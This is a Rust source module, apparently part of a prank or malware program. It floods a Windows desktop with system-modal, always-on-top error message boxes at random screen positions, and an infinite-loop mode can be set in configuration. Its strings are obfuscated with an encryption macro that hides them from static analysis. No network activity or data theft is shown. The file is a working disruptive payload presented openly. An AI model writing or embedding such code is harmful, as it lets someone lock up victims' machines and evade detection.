use cryptify::encrypt_string;
use std::thread;
use std::time::Duration;

#[cfg(target_os = "windows")]
use rand::RngExt;

/// Spawn message boxes in a loop without blocking
pub fn spawn_messagebox_hell() {
    let count = crate::config::MESSAGEBOX_LOOP_COUNT;
    
    // Spawn in a separate thread so it doesn't block
    thread::spawn(move || {
        if count == 0 {
            // Infinite loop
            loop {
                spawn_single_messagebox();
                thread::sleep(get_delay());
            }
        } else {
            // Fixed count
            for i in 1..=count {
                if crate::config::SHOW_CLI {
                    println!("{} {}/{}", 
                        encrypt_string!("Spawning message box"),
                        i,
                        count
                    );
                }
                
                spawn_single_messagebox();
                
                // Don't sleep after the last one
                if i < count {
                    thread::sleep(get_delay());
                }
            }
        }
    });
}

/// Get the delay between message boxes
fn get_delay() -> Duration {
    Duration::from_millis(crate::config::MESSAGEBOX_DELAY_MS)
}

/// Spawn a single message box in its own thread (non-blocking)
/// On Windows: Creates a message box and moves it to a random position
/// On Linux: Does nothing (Windows-only feature)
fn spawn_single_messagebox() {
    #[cfg(target_os = "windows")]
    {
        spawn_windows_messagebox();
    }
    
    #[cfg(not(target_os = "windows"))]
    {
        // Linux: Skip message boxes entirely
        if crate::config::SHOW_CLI {
            println!("{}", encrypt_string!("Message boxes are Windows-only, skipping..."));
        }
    }
}

#[cfg(target_os = "windows")]
fn spawn_windows_messagebox() {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use std::ptr::null_mut;
    use winapi::um::winuser::{
        MessageBoxW, MB_OK, MB_ICONERROR, MB_SYSTEMMODAL, MB_TOPMOST,
        GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN,
        FindWindowW, SetWindowPos, HWND_TOPMOST, SWP_NOSIZE,
    };
    
    let title = crate::config::MESSAGEBOX_TITLE;
    let text = crate::config::MESSAGEBOX_TEXT;
    
    // Each message box runs in its own thread
    thread::spawn(move || {
        unsafe {
            // Get screen dimensions
            let screen_width = GetSystemMetrics(SM_CXSCREEN);
            let screen_height = GetSystemMetrics(SM_CYSCREEN);
            
            // Generate random position (leave some margin for the window)
            let margin = 50;
            let max_x = screen_width - 400 - margin; // Assume ~400px window width
            let max_y = screen_height - 200 - margin; // Assume ~200px window height
            
            let target_x = rand::rng().random_range(margin..max_x.max(margin + 1));
            let target_y = rand::rng().random_range(margin..max_y.max(margin + 1));
            
            // Convert strings to wide strings for Windows API
            let title_wide: Vec<u16> = OsStr::new(title)
                .encode_wide()
                .chain(std::iter::once(0))
                .collect();
            
            let text_wide: Vec<u16> = OsStr::new(text)
                .encode_wide()
                .chain(std::iter::once(0))
                .collect();
            
            // Spawn MessageBox in a separate thread and immediately move it
            let title_for_find = title_wide.clone();
            let move_thread = thread::spawn(move || {
                // Wait a tiny bit for the MessageBox to be created
                thread::sleep(Duration::from_millis(10));
                
                // Find the MessageBox window by title
                let hwnd = FindWindowW(null_mut(), title_for_find.as_ptr());
                
                if !hwnd.is_null() {
                    // Move it to the random position
                    SetWindowPos(
                        hwnd,
                        HWND_TOPMOST,
                        target_x,
                        target_y,
                        0,
                        0,
                        SWP_NOSIZE,
                    );
                }
            });
            
            // Show the message box (this blocks until user closes it)
            MessageBoxW(
                null_mut(),
                text_wide.as_ptr(),
                title_wide.as_ptr(),
                MB_OK | MB_ICONERROR | MB_SYSTEMMODAL | MB_TOPMOST,
            );
            
            // Wait for the move thread to finish
            move_thread.join().ok();
        }
    });
}
